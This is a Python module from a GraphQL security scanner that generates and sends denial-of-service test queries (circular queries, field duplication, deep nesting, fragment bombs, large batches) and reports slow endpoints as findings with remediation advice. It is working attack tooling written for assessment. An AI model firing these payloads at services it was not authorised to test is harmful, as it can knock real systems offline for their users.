"""
GrapeQL DoS Tester
Author: Aleksa Zatezalo
Version: 3.0
Date: February 2025
Description: Tests GraphQL endpoints for Denial of Service vulnerabilities.
             Attack configurations are loaded from YAML. Uses the baseline
             tracker from other modules to set a statistically meaningful
             threshold before confirming DoS.
"""

import asyncio
import time
from typing import Dict, List, Optional, Tuple, Any
from .tester import VulnerabilityTester
from .utils import Finding
from .client import GraphQLClient
from .logger import GrapeLogger
from .loader import TestCaseLoader
from .baseline import BaselineTracker


class DosTester(VulnerabilityTester):
    """
    Tests GraphQL endpoints for various Denial of Service vulnerabilities.
    Attack patterns come from ``test_cases/dos/*.yaml``.
    The response-time threshold is computed from the BaselineTracker
    (avg + 3σ across all other modules), with a configurable floor.
    """

    MODULE_NAME = "dos"

    def __init__(
        self,
        logger: Optional[GrapeLogger] = None,
        loader: Optional[TestCaseLoader] = None,
        baseline: Optional[BaselineTracker] = None,
    ):
        super().__init__(logger=logger, loader=loader, baseline=baseline)
        self.test_name = "GraphQL DoS Testing"
        self.types: Dict[str, Dict] = {}
        self.query_type: Optional[str] = None

    async def setup_endpoint(
        self,
        endpoint: str,
        proxy: Optional[str] = None,
        pre_configured_client: Optional[GraphQLClient] = None,
    ) -> bool:
        result = await super().setup_endpoint(endpoint, proxy, pre_configured_client)

        if result and self.client.schema:
            self.query_type = self.client.schema.get("queryType", {}).get("name")
            for type_info in self.client.schema.get("types", []):
                if type_info.get("fields"):
                    self.types[type_info.get("name")] = {
                        "fields": type_info.get("fields", [])
                    }
        return result

    # ------------------------------------------------------------------ #
    #  Threshold computation from baseline
    # ------------------------------------------------------------------ #

    def _get_threshold(self) -> float:
        """
        Return the response-time threshold (seconds) above which a
        response is considered a DoS indicator.

        If a baseline tracker with samples is available:
            threshold = max(5.0, mean + 3 * stddev)
        Otherwise falls back to a hard 5.0 s floor.
        """
        if self.baseline and self.baseline.has_baseline():
            threshold = self.baseline.get_dos_threshold(min_threshold=5.0)
            self.printer.print_msg(
                f"DoS threshold from baseline: {threshold:.2f}s", status="log"
            )
            return threshold
        self.printer.print_msg(
            "No baseline available — using default 5.0s threshold", status="warning"
        )
        return 5.0

    # ------------------------------------------------------------------ #
    #  Query generators (schema-aware, parameterised by YAML config)
    # ------------------------------------------------------------------ #

    def generate_circular_query(self, cfg: Optional[Dict] = None) -> str:
        if not self.types:
            return ""

        depth = (cfg or {}).get("depth", 10)
        duplicates = (cfg or {}).get("duplicates", 3)

        circular_refs = []
        for type_name, type_info in self.types.items():
            for field in type_info.get("fields", []):
                ft = field.get("type", {})
                target = ft.get("name") or ft.get("ofType", {}).get("name")
                if target in self.types:
                    circular_refs.append({"field": field["name"], "target": target})

        if not circular_refs:
            return ""

        ref = circular_refs[0]
        inner = "id\nname\ndescription\ncreatedAt"
        for _ in range(depth):
            inner = (
                f"{ref['field']} {{\n  id\n  name\n  description\n  createdAt\n"
                f"  {inner}\n  {ref['field']} {{\n    id\n    name\n    {inner}\n  }}\n}}"
            )

        body = (inner + "\n") * duplicates
        return f"query CircularQuery {{\n{body}\n}}"

    def generate_field_duplication(self, cfg: Optional[Dict] = None) -> str:
        if not self.query_type or not self.types.get(self.query_type):
            return ""
        repeat = (cfg or {}).get("repeat_count", 10000)

        scalar_fields = [
            f["name"]
            for f in self.types[self.query_type].get("fields", [])
            if f.get("type", {}).get("name")
            in ["String", "Int", "Float", "Boolean", "ID"]
        ]
        if not scalar_fields:
            return ""
        return f"query {{ {(scalar_fields[0] + chr(10)) * repeat} }}"

    def generate_deeply_nested_query(self, cfg: Optional[Dict] = None) -> str:
        if not self.query_type or not self.types.get(self.query_type):
            return ""
        depth = (cfg or {}).get("depth", 100)

        object_fields = []
        for f in self.types[self.query_type].get("fields", []):
            ft = f.get("type", {})
            target = ft.get("name") or ft.get("ofType", {}).get("name")
            if target in self.types:
                object_fields.append(f["name"])
        if not object_fields:
            return ""

        q = "id"
        for _ in range(depth):
            q = f"{object_fields[0]} {{ {q} }}"
        return f"query {{ {q} }}"

    def generate_fragment_bomb(self, cfg: Optional[Dict] = None) -> str:
        if not self.query_type or not self.types.get(self.query_type):
            return ""
        count = (cfg or {}).get("fragment_count", 50)

        usable = [
            t
            for t, info in self.types.items()
            if t not in ("Query", "Mutation") and info.get("fields")
        ]
        if not usable:
            return ""

        frags, spreads = [], []
        for i in range(min(count, len(usable) or count)):
            tn = usable[i % len(usable)]
            fn = f"Frag{i}"
            nf = f"Frag{(i + 1) % count}"
            frags.append(f"fragment {fn} on {tn} {{ ... on {tn} {{ ...{nf} }} }}")
            spreads.append(f"...{fn}")

        return f"query FragmentBomb {{ {' '.join(spreads)} }}\n{chr(10).join(frags)}"

    def generate_array_batching(
        self, cfg: Optional[Dict] = None
    ) -> List[Dict[str, str]]:
        if not self.query_type or not self.types.get(self.query_type):
            return []
        batch_size = (cfg or {}).get("batch_size", 1000)

        fields = self.types[self.query_type].get("fields", [])
        if not fields:
            return []
        first = fields[0]["name"]
        return [{"query": f"query {{ {first} {{ id }} }}"} for _ in range(batch_size)]

    # Map generator names (from YAML) to methods
    _GENERATORS = {
        "generate_circular_query": generate_circular_query,
        "generate_field_duplication": generate_field_duplication,
        "generate_deeply_nested_query": generate_deeply_nested_query,
        "generate_fragment_bomb": generate_fragment_bomb,
        "generate_array_batching": generate_array_batching,
    }

    # ------------------------------------------------------------------ #
    #  Test runner
    # ------------------------------------------------------------------ #

    async def _test_single_query(
        self, query: str, test_name: str, threshold: float
    ) -> Tuple[bool, float]:
        """Send query, return (is_vulnerable, duration)."""
        if not query:
            return False, 0.0

        self.client.set_log_context("DosTester", test_name)
        start = time.time()
        try:
            response, error = await self.client.graphql_query(
                query,
                _log_parameter="dos_payload",
                _log_payload=query[:120],
            )
            duration = time.time() - start

            is_vuln = duration > threshold or (
                response
                and "errors" in response
                and any(
                    kw in str(e.get("message", "")).lower()
                    for e in response.get("errors", [])
                    for kw in ("timeout", "memory", "stack")
                )
            )
            return is_vuln, duration

        except asyncio.TimeoutError:
            duration = time.time() - start
            if self.logger:
                self.logger.log_timeout(
                    module="DosTester", test=test_name, duration=duration
                )
            return True, duration
        except Exception:
            return True, time.time() - start

    async def run_test(self) -> List[Finding]:
        if not self.client.endpoint or not self.types:
            self.printer.print_msg(
                "No endpoint set or schema not retrieved.", status="error"
            )
            return self.findings

        self.printer.print_section("Starting Denial of Service Testing")
        self.printer.print_msg(
            "Warning: The application may become unresponsive.", status="warning"
        )

        threshold = self._get_threshold()

        # If we have YAML test cases, drive from them
        cases = self.test_cases if self.test_cases else []

        # Fallback: generate a default list if no YAML
        if not cases:
            cases = [
                {
                    "name": "circular_query",
                    "title": "Circular Query DoS",
                    "generator": "generate_circular_query",
                    "severity": "HIGH",
                    "impact": "Server resource exhaustion",
                    "remediation": "Implement query depth/cost limits",
                },
                {
                    "name": "field_duplication",
                    "title": "Field Duplication DoS",
                    "generator": "generate_field_duplication",
                    "severity": "HIGH",
                    "impact": "Server resource exhaustion",
                    "remediation": "Implement query depth/cost limits",
                },
                {
                    "name": "deep_nesting",
                    "title": "Deeply Nested Query DoS",
                    "generator": "generate_deeply_nested_query",
                    "severity": "HIGH",
                    "impact": "Server resource exhaustion",
                    "remediation": "Implement query depth/cost limits",
                },
                {
                    "name": "fragment_bomb",
                    "title": "Fragment Bomb DoS",
                    "generator": "generate_fragment_bomb",
                    "severity": "HIGH",
                    "impact": "Server resource exhaustion",
                    "remediation": "Implement query depth/cost limits",
                },
                {
                    "name": "array_batching",
                    "title": "Array Batching DoS",
                    "generator": "generate_array_batching",
                    "severity": "HIGH",
                    "send_as": "batch",
                    "impact": "Server resource exhaustion via batch",
                    "remediation": "Limit batch size",
                },
            ]

        for tc in cases:
            test_name = tc.get("title", tc.get("name", "unknown"))
            generator_name = tc.get("generator", "")
            send_as = tc.get("send_as", "query")

            self.printer.print_msg(f"Testing for {test_name}...", status="log")

            gen_fn = self._GENERATORS.get(generator_name)
            if not gen_fn:
                self.printer.print_msg(
                    f"Unknown generator '{generator_name}' — skipping", status="warning"
                )
                continue

            result = gen_fn(self, tc)

            # ── Batch attack (array of query dicts) ──────────────
            if send_as == "batch":
                if not result:
                    self.printer.print_msg(
                        f"Skipping {test_name} — could not generate queries",
                        status="warning",
                    )
                    continue

                self.client.set_log_context("DosTester", test_name)
                start = time.time()
                try:
                    resp, _ = await self.client.make_request(
                        "POST",
                        json=result,
                        _log_parameter="dos_batch",
                        _log_payload=f"batch[{len(result)}]",
                    )
                    duration = time.time() - start
                    is_vuln = duration > threshold
                except Exception:
                    duration = time.time() - start
                    is_vuln = True

            # ── Single query attack ──────────────────────────────
            else:
                if not result:
                    self.printer.print_msg(
                        f"Skipping {test_name} — could not generate query",
                        status="warning",
                    )
                    continue
                is_vuln, duration = await self._test_single_query(
                    result, test_name, threshold
                )

            # ── Report ───────────────────────────────────────────
            if is_vuln:
                self.printer.print_msg(
                    f"Endpoint is VULNERABLE to {test_name}!", status="failed"
                )
                self.printer.print_msg(
                    f"Response time: {duration:.2f}s (threshold: {threshold:.2f}s)",
                    status="failed",
                )
                finding = Finding(
                    title=f"DoS Vulnerability: {test_name}",
                    severity=tc.get("severity", "HIGH"),
                    description=(
                        f"The endpoint is vulnerable to DoS via {test_name.lower()}. "
                        f"Response time: {duration:.2f}s (threshold: {threshold:.2f}s)."
                    ),
                    endpoint=self.client.endpoint,
                    impact=tc.get("impact", "Service disruption"),
                    remediation=tc.get("remediation", "Implement query cost analysis"),
                )
                self.findings.append(finding)
                self.add_finding(finding)
            else:
                self.printer.print_msg(
                    f"NOT vulnerable to {test_name} ({duration:.2f}s)",
                    status="success",
                )

            await asyncio.sleep(5)

        return self.findings
